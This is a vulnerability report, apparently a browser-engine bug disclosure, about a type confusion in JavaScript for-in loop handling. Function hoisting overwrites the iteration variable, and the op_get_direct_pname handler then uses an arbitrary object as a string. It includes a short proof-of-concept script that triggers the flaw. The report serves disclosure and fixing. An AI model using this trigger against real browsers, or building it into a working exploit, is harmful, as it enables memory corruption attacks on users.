/*
This is simillar to  issue 1263 . When hoisting a function onto the outer scope, if it overwrites the iteration variable for a for-in loop it should invalidate the corresponding ForInContext object, but it doesn't. As a result, an arbitrary object can be passed as the property variable to the op_get_direct_pname handler which uses the property variable directly as a string object without any check.

PoC:

    let o = {a: 1};
    for (var k in o) {
        {
            k = 0x1234;

            function k() {

            }
        }

        o[k];
    }
